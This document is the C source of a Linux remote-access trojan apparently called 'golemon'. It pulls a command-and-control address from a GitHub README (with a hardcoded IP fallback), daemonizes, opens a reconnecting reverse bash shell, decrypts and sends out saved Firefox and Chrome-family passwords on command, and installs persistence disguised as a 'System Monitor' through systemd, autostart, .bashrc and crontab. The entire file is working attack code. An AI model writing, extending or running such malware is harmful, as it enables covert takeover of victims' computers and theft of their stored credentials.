#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pty.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <pwd.h>
#include <glob.h>
#include <dlfcn.h>
#include <sqlite3.h>
#include <curl/curl.h>

#define README_URL "https://raw.githubusercontent.com/dilipk5/golemon/refs/heads/main/README.md"

// Callback structure for curl
struct MemoryStruct {
    char *memory;
    size_t size;
};

#define BUFFER_SIZE 1024


// Base64 decode table
static const unsigned char base64_table[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

int base64_decode(const char *input, unsigned char **output, size_t *output_len) {
    size_t input_len = strlen(input);
    size_t max_output_len = (input_len / 4) * 3;
    
    *output = (unsigned char *)malloc(max_output_len + 1);
    if (!*output) return -1;
    
    size_t out_pos = 0;
    unsigned char buf[4];
    int buf_pos = 0;
    
    for (size_t i = 0; i < input_len; i++) {
        unsigned char c = base64_table[(unsigned char)input[i]];
        if (c == 64) continue;
        
        buf[buf_pos++] = c;
        if (buf_pos == 4) {
            (*output)[out_pos++] = (buf[0] << 2) | (buf[1] >> 4);
            (*output)[out_pos++] = (buf[1] << 4) | (buf[2] >> 2);
            (*output)[out_pos++] = (buf[2] << 6) | buf[3];
            buf_pos = 0;
        }
    }
    
    if (buf_pos >= 2) {
        (*output)[out_pos++] = (buf[0] << 2) | (buf[1] >> 4);
        if (buf_pos >= 3) {
            (*output)[out_pos++] = (buf[1] << 4) | (buf[2] >> 2);
        }
    }
    
    *output_len = out_pos;
    (*output)[out_pos] = '\0';
    return 0;
}

char *get_home_dir() {
    char *home = getenv("HOME");
    if (home) return strdup(home);
    
    struct passwd *pw = getpwuid(getuid());
    if (pw) return strdup(pw->pw_dir);
    
    return NULL;
}

int file_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 && S_ISREG(st.st_mode);
}

// NSS library structures and types
typedef enum {
    siBuffer = 0
} SECItemType;

typedef struct {
    SECItemType type;
    unsigned char *data;
    unsigned int len;
} SECItem;

typedef int SECStatus;

// Function pointers for NSS library
typedef SECStatus (*NSS_Init_t)(const char *configdir);
typedef SECStatus (*PK11SDR_Decrypt_t)(SECItem *data, SECItem *result, void *cx);
typedef SECStatus (*NSS_Shutdown_t)(void);

NSS_Init_t NSS_Init_func = NULL;
PK11SDR_Decrypt_t PK11SDR_Decrypt_func = NULL;
NSS_Shutdown_t NSS_Shutdown_func = NULL;

char *find_valid_profile() {
    char *home = get_home_dir();
    if (!home) return NULL;
    
    const char *profile_patterns[] = {
        "%s/.mozilla/firefox/*default*",
        "%s/.config/mozilla/firefox/*default*",
        "%s/snap/firefox/common/.mozilla/firefox/*default*",
        "%s/.var/app/org.mozilla.firefox/.mozilla/firefox/*default*",
        NULL
    };
    
    glob_t globbuf;
    char *valid_profile = NULL;
    
    for (int p = 0; profile_patterns[p] != NULL && !valid_profile; p++) {
        char pattern[1024];
        snprintf(pattern, sizeof(pattern), profile_patterns[p], home);
        
        if (glob(pattern, GLOB_TILDE, NULL, &globbuf) == 0) {
            for (size_t i = 0; i < globbuf.gl_pathc; i++) {
                char logins_path[2048];
                snprintf(logins_path, sizeof(logins_path), "%s/logins.json", globbuf.gl_pathv[i]);
                if (file_exists(logins_path)) {
                    valid_profile = strdup(globbuf.gl_pathv[i]);
                    break;
                }
            }
            globfree(&globbuf);
        }
    }
    
    free(home);
    return valid_profile;
}

void *load_libnss() {
    const char *locations[] = {
        "/usr/lib/x86_64-linux-gnu/nss/libnss3.so",
        "/usr/lib/x86_64-linux-gnu/libnss3.so",
        "/usr/lib/firefox/libnss3.so",
        "/usr/lib/libnss3.so",
        "/usr/lib64/libnss3.so",
        "libnss3.so",
        NULL
    };
    
    void *handle = NULL;
    for (int i = 0; locations[i] != NULL; i++) {
        handle = dlopen(locations[i], RTLD_LAZY);
        if (handle) return handle;
    }
    
    return NULL;
}

int init_nss(const char *profile_path, void **nss_handle) {
    *nss_handle = load_libnss();
    if (!*nss_handle) return -1;
    
    NSS_Init_func = (NSS_Init_t)dlsym(*nss_handle, "NSS_Init");
    PK11SDR_Decrypt_func = (PK11SDR_Decrypt_t)dlsym(*nss_handle, "PK11SDR_Decrypt");
    NSS_Shutdown_func = (NSS_Shutdown_t)dlsym(*nss_handle, "NSS_Shutdown");
    
    if (!NSS_Init_func || !PK11SDR_Decrypt_func) {
        dlclose(*nss_handle);
        return -1;
    }
    
    char init_path[2048];
    snprintf(init_path, sizeof(init_path), "sql:%s", profile_path);
    
    if (NSS_Init_func(init_path) != 0) {
        dlclose(*nss_handle);
        return -1;
    }
    
    return 0;
}

char *decrypt_string(const char *encrypted_b64) {
    unsigned char *encrypted_data;
    size_t encrypted_len;
    
    if (base64_decode(encrypted_b64, &encrypted_data, &encrypted_len) != 0) {
        return NULL;
    }
    
    SECItem input = {0};
    input.type = siBuffer;
    input.data = encrypted_data;
    input.len = encrypted_len;
    
    SECItem output = {0};
    output.type = siBuffer;
    output.data = NULL;
    output.len = 0;
    
    if (PK11SDR_Decrypt_func(&input, &output, NULL) != 0) {
        free(encrypted_data);
        return NULL;
    }
    
    char *result = (char *)malloc(output.len + 1);
    if (result) {
        memcpy(result, output.data, output.len);
        result[output.len] = '\0';
    }
    
    free(encrypted_data);
    return result;
}

void extract_credentials_to_fd(const char *logins_path, int fd) {
    FILE *fp = fopen(logins_path, "r");
    if (!fp) {
        dprintf(fd, "Error: Cannot open logins.json\n");
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    char *content = (char *)malloc(fsize + 1);
    fread(content, 1, fsize, fp);
    content[fsize] = '\0';
    fclose(fp);
    
    char *ptr = content;
    int count = 0;
    
    while ((ptr = strstr(ptr, "\"hostname\":")) != NULL) {
        count++;
        
        // Extract hostname
        ptr += 11;
        while (*ptr == ' ' || *ptr == '"') ptr++;
        char hostname[512] = {0};
        int i = 0;
        while (*ptr && *ptr != '"' && i < 511) {
            hostname[i++] = *ptr++;
        }
        
        // Find encryptedUsername
        char *user_ptr = strstr(ptr, "\"encryptedUsername\":");
        if (!user_ptr) continue;
        user_ptr += 20;
        while (*user_ptr == ' ' || *user_ptr == '"') user_ptr++;
        char enc_username[4096] = {0};
        i = 0;
        while (*user_ptr && *user_ptr != '"' && i < 4095) {
            enc_username[i++] = *user_ptr++;
        }
        
        // Find encryptedPassword
        char *pass_ptr = strstr(user_ptr, "\"encryptedPassword\":");
        if (!pass_ptr) continue;
        pass_ptr += 20;
        while (*pass_ptr == ' ' || *pass_ptr == '"') pass_ptr++;
        char enc_password[4096] = {0};
        i = 0;
        while (*pass_ptr && *pass_ptr != '"' && i < 4095) {
            enc_password[i++] = *pass_ptr++;
        }
        
        // Decrypt
        char *username = decrypt_string(enc_username);
        char *password = decrypt_string(enc_password);
        
        dprintf(fd, "[%d] URL: %s\n", count, hostname);
        dprintf(fd, "    Username: %s\n", username ? username : "(decryption failed)");
        dprintf(fd, "    Password: %s\n\n", password ? password : "(decryption failed)");
        
        if (username) free(username);
        if (password) free(password);
    }
    
    free(content);
    
    if (count == 0) {
        dprintf(fd, "No credentials found.\n");
    } else {
        dprintf(fd, "\nTotal credentials found: %d\n", count);
    }
}

void extract_firefox_credentials(int output_fd) {
    char *home = get_home_dir();
    if (!home) {
        dprintf(output_fd, "Error: Cannot determine home directory\n");
        dprintf(output_fd, "DUMP_COMPLETE\n");
        return;
    }
    
    const char *profile_patterns[] = {
        // Standard Firefox locations
        "%s/.mozilla/firefox/*.default-release",
        "%s/.mozilla/firefox/*.default",
        "%s/.mozilla/firefox/*default*",
        
        // XDG config locations
        "%s/.config/mozilla/firefox/*.default-release",
        "%s/.config/mozilla/firefox/*.default",
        "%s/.config/mozilla/firefox/*default*",
        
        // Snap package
        "%s/snap/firefox/common/.mozilla/firefox/*.default-release",
        "%s/snap/firefox/common/.mozilla/firefox/*.default",
        "%s/snap/firefox/common/.mozilla/firefox/*default*",
        
        // Flatpak
        "%s/.var/app/org.mozilla.firefox/.mozilla/firefox/*.default-release",
        "%s/.var/app/org.mozilla.firefox/.mozilla/firefox/*.default",
        "%s/.var/app/org.mozilla.firefox/.mozilla/firefox/*default*",
        
        // Firefox ESR
        "%s/.mozilla/firefox-esr/*.default",
        "%s/.mozilla/firefox-esr/*default*",
        
        NULL
    };
    
    int total_profiles = 0;
    int total_creds = 0;
    
    dprintf(output_fd, "=== Searching for Firefox profiles ===\n\n");
    
    for (int p = 0; profile_patterns[p] != NULL; p++) {
        char pattern[1024];
        snprintf(pattern, sizeof(pattern), profile_patterns[p], home);
        
        glob_t globbuf;
        if (glob(pattern, GLOB_TILDE, NULL, &globbuf) == 0) {
            for (size_t i = 0; i < globbuf.gl_pathc; i++) {
                char logins_path[2048];
                snprintf(logins_path, sizeof(logins_path), "%s/logins.json", globbuf.gl_pathv[i]);
                
                if (file_exists(logins_path)) {
                    total_profiles++;
                    dprintf(output_fd, "[Profile %d] %s\n", total_profiles, globbuf.gl_pathv[i]);
                    
                    void *nss_handle;
                    if (init_nss(globbuf.gl_pathv[i], &nss_handle) != 0) {
                        dprintf(output_fd, "  [!] Failed to initialize NSS library\n\n");
                        continue;
                    }
                    
                    // Count credentials before extraction
                    FILE *fp = fopen(logins_path, "r");
                    if (fp) {
                        fseek(fp, 0, SEEK_END);
                        long fsize = ftell(fp);
                        fseek(fp, 0, SEEK_SET);
                        char *content = malloc(fsize + 1);
                        fread(content, 1, fsize, fp);
                        content[fsize] = '\0';
                        fclose(fp);
                        
                        int profile_creds = 0;
                        char *ptr = content;
                        while ((ptr = strstr(ptr, "\"hostname\":")) != NULL) {
                            profile_creds++;
                            ptr++;
                        }
                        
                        if (profile_creds > 0) {
                            dprintf(output_fd, "  [+] Found %d credentials\n\n", profile_creds);
                            total_creds += profile_creds;
                            
                            // Now extract them
                            extract_credentials_to_fd(logins_path, output_fd);
                        } else {
                            dprintf(output_fd, "  [-] No credentials found\n\n");
                        }
                        
                        free(content);
                    }
                    
                    if (NSS_Shutdown_func) {
                        NSS_Shutdown_func();
                    }
                    if (nss_handle) {
                        dlclose(nss_handle);
                    }
                }
            }
            globfree(&globbuf);
        }
    }
    
    free(home);
    
    if (total_profiles == 0) {
        dprintf(output_fd, "[-] No Firefox profiles found\n");
    } else {
        dprintf(output_fd, "\n=== Summary ===\n");
        dprintf(output_fd, "Total profiles scanned: %d\n", total_profiles);
        dprintf(output_fd, "Total credentials found: %d\n", total_creds);
    }
    
    dprintf(output_fd, "DUMP_COMPLETE\n");
}

// Find Chrome/Chromium profile
char *find_chrome_profile() {
    char *home = get_home_dir();
    if (!home) return NULL;
    
    const char *profile_patterns[] = {
        // Chrome
        "%s/.config/google-chrome/Default",
        "%s/.config/google-chrome/Profile 1",
        "%s/snap/chromium/common/chromium/Default",
        
        // Chromium
        "%s/.config/chromium/Default",
        "%s/.config/chromium/Profile 1",
        
        // Brave
        "%s/.config/BraveSoftware/Brave-Browser/Default",
        "%s/.config/BraveSoftware/Brave-Browser/Profile 1",
        
        // Edge
        "%s/.config/microsoft-edge/Default",
        "%s/.config/microsoft-edge/Profile 1",
        
        // Vivaldi
        "%s/.config/vivaldi/Default",
        
        // Opera
        "%s/.config/opera/Default",
        
        NULL
    };
    
    char *valid_profile = NULL;
    
    for (int p = 0; profile_patterns[p] != NULL && !valid_profile; p++) {
        char path[1024];
        snprintf(path, sizeof(path), profile_patterns[p], home);
        
        char login_data[2048];
        snprintf(login_data, sizeof(login_data), "%s/Login Data", path);
        
        if (file_exists(login_data)) {
            valid_profile = strdup(path);
            break;
        }
    }
    
    free(home);
    return valid_profile;
}

// Decrypt Chrome password using libsecret
char *decrypt_chrome_password(const unsigned char *encrypted_data, size_t encrypted_len) {
    // Chrome v80+ uses AES encryption with a key stored in the keyring
    // For simplicity, we'll try to decrypt v10 format (starts with "v10")
    
    if (encrypted_len < 3) return NULL;
    
    // Check if it's v10 encrypted (most modern Chrome versions)
    if (memcmp(encrypted_data, "v10", 3) == 0) {
        // v10 format: "v10" + IV (12 bytes) + ciphertext + tag (16 bytes)
        // This requires getting the encryption key from the keyring
        // For now, we'll indicate it's encrypted
        return strdup("(v10 encrypted - requires keyring access)");
    }
    
    // Older versions might use different encryption
    // Try to return as-is if it's plaintext
    char *result = (char *)malloc(encrypted_len + 1);
    if (result) {
        memcpy(result, encrypted_data, encrypted_len);
        result[encrypted_len] = '\0';
    }
    
    return result;
}

void extract_chrome_credentials(int output_fd) {
    char *home = get_home_dir();
    if (!home) {
        dprintf(output_fd, "Error: Cannot determine home directory\n");
        dprintf(output_fd, "DUMP_COMPLETE\n");
        return;
    }
    
    const char *profile_patterns[] = {
        // Google Chrome
        "%s/.config/google-chrome/Default",
        "%s/.config/google-chrome/Profile 1",
        "%s/.config/google-chrome/Profile 2",
        "%s/.config/google-chrome/Profile 3",
        "%s/.config/google-chrome/Profile 4",
        "%s/.config/google-chrome/Profile 5",
        
        // Chromium
        "%s/.config/chromium/Default",
        "%s/.config/chromium/Profile 1",
        "%s/.config/chromium/Profile 2",
        "%s/.config/chromium/Profile 3",
        
        // Chromium Snap
        "%s/snap/chromium/common/chromium/Default",
        "%s/snap/chromium/common/chromium/Profile 1",
        
        // Brave Browser
        "%s/.config/BraveSoftware/Brave-Browser/Default",
        "%s/.config/BraveSoftware/Brave-Browser/Profile 1",
        "%s/.config/BraveSoftware/Brave-Browser/Profile 2",
        "%s/.config/BraveSoftware/Brave-Browser/Profile 3",
        
        // Brave Snap
        "%s/snap/brave/current/.config/BraveSoftware/Brave-Browser/Default",
        
        // Microsoft Edge
        "%s/.config/microsoft-edge/Default",
        "%s/.config/microsoft-edge/Profile 1",
        "%s/.config/microsoft-edge/Profile 2",
        
        // Vivaldi
        "%s/.config/vivaldi/Default",
        "%s/.config/vivaldi/Profile 1",
        
        // Opera
        "%s/.config/opera/Default",
        "%s/.config/opera/Profile 1",
        
        // Opera GX
        "%s/.config/opera-gx/Default",
        
        // Ungoogled Chromium
        "%s/.config/ungoogled-chromium/Default",
        
        // Slimjet
        "%s/.config/slimjet/Default",
        
        // Yandex Browser
        "%s/.config/yandex-browser/Default",
        "%s/.config/yandex-browser/Profile 1",
        
        NULL
    };
    
    int total_profiles = 0;
    int total_creds = 0;
    
    dprintf(output_fd, "=== Searching for Chrome/Chromium profiles ===\n\n");
    
    for (int p = 0; profile_patterns[p] != NULL; p++) {
        char path[1024];
        snprintf(path, sizeof(path), profile_patterns[p], home);
        
        char login_data_path[2048];
        snprintf(login_data_path, sizeof(login_data_path), "%s/Login Data", path);
        
        if (file_exists(login_data_path)) {
            total_profiles++;
            dprintf(output_fd, "[Profile %d] %s\n", total_profiles, path);
            
            // Copy Login Data to temp file
            char temp_db_path[2048];
            snprintf(temp_db_path, sizeof(temp_db_path), "/tmp/chrome_login_%d_%d.db", getpid(), total_profiles);
            
            FILE *src = fopen(login_data_path, "rb");
            if (!src) {
                dprintf(output_fd, "  [!] Cannot open Login Data\n\n");
                continue;
            }
            
            FILE *dst = fopen(temp_db_path, "wb");
            if (!dst) {
                fclose(src);
                dprintf(output_fd, "  [!] Cannot create temp database\n\n");
                continue;
            }
            
            char buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                fwrite(buffer, 1, bytes, dst);
            }
            fclose(src);
            fclose(dst);
            
            // Open SQLite database
            sqlite3 *db;
            if (sqlite3_open(temp_db_path, &db) != SQLITE_OK) {
                dprintf(output_fd, "  [!] Cannot open SQLite database\n\n");
                unlink(temp_db_path);
                continue;
            }
            
            // Query passwords
            const char *query = "SELECT origin_url, username_value, password_value FROM logins";
            sqlite3_stmt *stmt;
            
            if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
                dprintf(output_fd, "  [!] Cannot prepare SQL query\n\n");
                sqlite3_close(db);
                unlink(temp_db_path);
                continue;
            }
            
            int profile_creds = 0;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                profile_creds++;
                total_creds++;
                
                const char *url = (const char *)sqlite3_column_text(stmt, 0);
                const char *username = (const char *)sqlite3_column_text(stmt, 1);
                const unsigned char *encrypted_password = sqlite3_column_blob(stmt, 2);
                int password_len = sqlite3_column_bytes(stmt, 2);
                
                char *password = decrypt_chrome_password(encrypted_password, password_len);
                
                dprintf(output_fd, "  [%d] URL: %s\n", profile_creds, url ? url : "(null)");
                dprintf(output_fd, "      Username: %s\n", username ? username : "(null)");
                dprintf(output_fd, "      Password: %s\n", password ? password : "(decryption failed)");
                
                if (password) free(password);
            }
            
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            unlink(temp_db_path);
            
            if (profile_creds == 0) {
                dprintf(output_fd, "  [-] No credentials found\n");
            } else {
                dprintf(output_fd, "  [+] Found %d credentials\n", profile_creds);
            }
            dprintf(output_fd, "\n");
        }
    }
    
    free(home);
    
    if (total_profiles == 0) {
        dprintf(output_fd, "[-] No Chrome/Chromium profiles found\n");
    } else {
        dprintf(output_fd, "=== Summary ===\n");
        dprintf(output_fd, "Total profiles scanned: %d\n", total_profiles);
        dprintf(output_fd, "Total credentials found: %d\n", total_creds);
        if (total_creds > 0) {
            dprintf(output_fd, "\nNote: Chrome v80+ uses encrypted passwords that require keyring access.\n");
            dprintf(output_fd, "Passwords shown as '(v10 encrypted)' need additional decryption.\n");
        }
    }
    
    dprintf(output_fd, "DUMP_COMPLETE\n");
}

// Install persistence mechanisms
void install_persistence(int output_fd) {
    char *home = get_home_dir();
    if (!home) {
        dprintf(output_fd, "[-] Cannot determine home directory\n");
        dprintf(output_fd, "PERSISTENCE_COMPLETE\n");
        return;
    }
    
    // Get current executable path
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) {
        dprintf(output_fd, "[-] Cannot determine executable path\n");
        free(home);
        dprintf(output_fd, "PERSISTENCE_COMPLETE\n");
        return;
    }
    exe_path[len] = '\0';
    
    dprintf(output_fd, "=== Installing Persistence Mechanisms ===\n\n");
    dprintf(output_fd, "[*] Executable: %s\n\n", exe_path);
    
    int success_count = 0;
    
    // Method 1: Systemd user service
    char systemd_dir[2048];
    snprintf(systemd_dir, sizeof(systemd_dir), "%s/.config/systemd/user", home);
    
    // Create directory if it doesn't exist
    char mkdir_cmd[2048];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s", systemd_dir);
    system(mkdir_cmd);
    
    char service_path[2048];
    snprintf(service_path, sizeof(service_path), "%s/system-monitor.service", systemd_dir);
    
    FILE *service_file = fopen(service_path, "w");
    if (service_file) {
        fprintf(service_file, "[Unit]\n");
        fprintf(service_file, "Description=System Monitor Service\n");
        fprintf(service_file, "After=network.target\n\n");
        fprintf(service_file, "[Service]\n");
        fprintf(service_file, "Type=simple\n");
        fprintf(service_file, "ExecStart=%s\n", exe_path);
        fprintf(service_file, "Restart=always\n");
        fprintf(service_file, "RestartSec=300\n\n");
        fprintf(service_file, "[Install]\n");
        fprintf(service_file, "WantedBy=default.target\n");
        fclose(service_file);
        
        // Enable the service
        system("systemctl --user daemon-reload 2>/dev/null");
        system("systemctl --user enable system-monitor.service 2>/dev/null");
        system("systemctl --user start system-monitor.service 2>/dev/null");
        
        dprintf(output_fd, "[+] Systemd user service installed: %s\n", service_path);
        success_count++;
    } else {
        dprintf(output_fd, "[-] Failed to create systemd service\n");
    }
    
    // Method 2: XDG Autostart (.desktop file)
    char autostart_dir[2048];
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home);
    
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s", autostart_dir);
    system(mkdir_cmd);
    
    char desktop_path[2048];
    snprintf(desktop_path, sizeof(desktop_path), "%s/system-monitor.desktop", autostart_dir);
    
    FILE *desktop_file = fopen(desktop_path, "w");
    if (desktop_file) {
        fprintf(desktop_file, "[Desktop Entry]\n");
        fprintf(desktop_file, "Type=Application\n");
        fprintf(desktop_file, "Name=System Monitor\n");
        fprintf(desktop_file, "Comment=System monitoring service\n");
        fprintf(desktop_file, "Exec=%s\n", exe_path);
        fprintf(desktop_file, "Hidden=false\n");
        fprintf(desktop_file, "NoDisplay=true\n");
        fprintf(desktop_file, "X-GNOME-Autostart-enabled=true\n");
        fclose(desktop_file);
        
        dprintf(output_fd, "[+] XDG Autostart entry installed: %s\n", desktop_path);
        success_count++;
    } else {
        dprintf(output_fd, "[-] Failed to create autostart entry\n");
    }
    
    // Method 3: Bash profile
    char bashrc_path[2048];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);
    
    FILE *bashrc = fopen(bashrc_path, "a");
    if (bashrc) {
        fprintf(bashrc, "\n# System monitor\n");
        fprintf(bashrc, "if ! pgrep -f '%s' > /dev/null; then\n", exe_path);
        fprintf(bashrc, "    %s &\n", exe_path);
        fprintf(bashrc, "fi\n");
        fclose(bashrc);
        
        dprintf(output_fd, "[+] Bash profile entry added: %s\n", bashrc_path);
        success_count++;
    } else {
        dprintf(output_fd, "[-] Failed to modify bash profile\n");
    }
    
    // Method 4: Crontab (@reboot)
    char cron_entry[2048];
    snprintf(cron_entry, sizeof(cron_entry), "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", exe_path);
    if (system(cron_entry) == 0) {
        dprintf(output_fd, "[+] Crontab @reboot entry added\n");
        success_count++;
    } else {
        dprintf(output_fd, "[-] Failed to add crontab entry\n");
    }
    
    free(home);
    
    dprintf(output_fd, "\n=== Summary ===\n");
    dprintf(output_fd, "Successfully installed: %d/4 persistence mechanisms\n", success_count);
    dprintf(output_fd, "\nPersistence methods:\n");
    dprintf(output_fd, "  1. Systemd user service (auto-restart on failure)\n");
    dprintf(output_fd, "  2. XDG Autostart (desktop environment)\n");
    dprintf(output_fd, "  3. Bash profile (shell login)\n");
    dprintf(output_fd, "  4. Crontab @reboot (system boot)\n");
    
    dprintf(output_fd, "PERSISTENCE_COMPLETE\n");
}

// Callback function for curl to write data
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) {
        return 0;
    }
    
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    
    return realsize;
}

// Extract server IP from README content
char* extract_server_ip(const char *content) {
    // Look for pattern: <!-- SERVER_IP = xxx.xxx.xxx.xxx -->
    const char *marker = "<!-- SERVER_IP = ";
    char *start = strstr(content, marker);
    
    if (!start) {
        return NULL;
    }
    
    start += strlen(marker);
    
    // Skip any whitespace or extra text before IP
    while (*start && (*start == ' ' || (*start >= 'a' && *start <= 'z') || (*start >= 'A' && *start <= 'Z'))) {
        start++;
    }
    
    char *end = strstr(start, " -->");
    if (!end) {
        end = strstr(start, "-->");
    }
    
    if (!end) {
        return NULL;
    }
    
    // Trim trailing spaces
    while (end > start && *(end - 1) == ' ') {
        end--;
    }
    
    size_t ip_len = end - start;
    char *ip = malloc(ip_len + 1);
    if (ip) {
        strncpy(ip, start, ip_len);
        ip[ip_len] = '\0';
    }
    
    return ip;
}

// Fetch server IP from GitHub README
char* fetch_server_ip() {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    char *server_ip = NULL;
    
    chunk.memory = malloc(1);
    chunk.size = 0;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, README_URL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "golemon-client/1.0");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        
        res = curl_easy_perform(curl);
        
        if (res == CURLE_OK) {
            server_ip = extract_server_ip(chunk.memory);
        }
        
        curl_easy_cleanup(curl);
    }
    
    free(chunk.memory);
    curl_global_cleanup();
    
    return server_ip;
}

#define BUFFER_SIZE 1024

int main(int argc, char *argv[]) {
    char *server_ip = NULL;
    int server_port = 9001;
    
    // Try to fetch server IP from GitHub README
    server_ip = fetch_server_ip();
    
    // Fallback to hardcoded IP if fetch fails
    if (!server_ip) {
        server_ip = strdup("15.206.168.84");
    }
    
    // Daemonize immediately on first run
    static int first_run = 1;
    if (first_run) {
        first_run = 0;
        pid_t daemon_pid = fork();
        
        if (daemon_pid < 0) {
            perror("Fork failed");
            exit(EXIT_FAILURE);
        }
        
        if (daemon_pid > 0) {
            // Parent process - exit and return to shell
            exit(EXIT_SUCCESS);
        }
        
        // Child continues as daemon
        setsid();
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
    }
    
    // Reconnection loop - retry every 5 minutes if connection fails
    while (1) {
        int sock;
        struct sockaddr_in server_addr;
        int master_fd;
        pid_t pid;
        char buffer[BUFFER_SIZE];
        fd_set read_fds;
        int max_fd;

        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(3);  // Wait 5 minutes before retry
            continue;
        }

        // Setup server address structure
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        
        if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
            close(sock);
            sleep(3);  // Wait 5 minutes before retry
            continue;
        }

        // Connect to server
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            sleep(3);  // Wait 5 minutes before retry
            continue;
        }

        // Successfully connected - spawn PTY shell
        pid = forkpty(&master_fd, NULL, NULL, NULL);
        
        if (pid < 0) {
            close(sock);
            sleep(3);  // Wait 5 minutes before retry
            continue;
        }
        
        if (pid == 0) {
            // Child process - execute shell
            char *args[] = {"/bin/bash", NULL};
            execve("/bin/bash", args, NULL);
            exit(EXIT_FAILURE);
        }

        // Parent process - relay data between socket and PTY
        max_fd = (sock > master_fd ? sock : master_fd) + 1;

        while (1) {
            FD_ZERO(&read_fds);
            FD_SET(sock, &read_fds);
            FD_SET(master_fd, &read_fds);

            if (select(max_fd, &read_fds, NULL, NULL, NULL) < 0) {
                break;
            }

            // Data from server -> PTY (shell input)
            if (FD_ISSET(sock, &read_fds)) {
                ssize_t n = read(sock, buffer, BUFFER_SIZE);
                if (n <= 0) {
                    break;  // Server disconnected - will reconnect
                }
                
                // Check for special commands
                if (strncmp(buffer, "FIREFOX_DUMP\n", 13) == 0) {
                    // Execute Firefox credential extraction
                    extract_firefox_credentials(sock);
                } else if (strncmp(buffer, "CHROME_DUMP\n", 12) == 0) {
                    // Execute Chrome credential extraction
                    extract_chrome_credentials(sock);
                } else if (strncmp(buffer, "INSTALL_PERSISTENCE\n", 20) == 0) {
                    // Execute persistence installation
                    install_persistence(sock);
                } else {
                    // Normal shell command - pass to PTY
                    write(master_fd, buffer, n);
                }
            }

            // Data from PTY -> server (shell output)
            if (FD_ISSET(master_fd, &read_fds)) {
                ssize_t n = read(master_fd, buffer, BUFFER_SIZE);
                if (n <= 0) {
                    break;  // Shell exited - will reconnect
                }
                write(sock, buffer, n);
            }
        }

        // Connection lost - cleanup and prepare to reconnect
        close(master_fd);
        close(sock);
        kill(pid, SIGTERM);
        waitpid(pid, NULL, 0);
        
        // Wait 5 minutes before attempting reconnection
        sleep(3);
    }

    return 0;
}
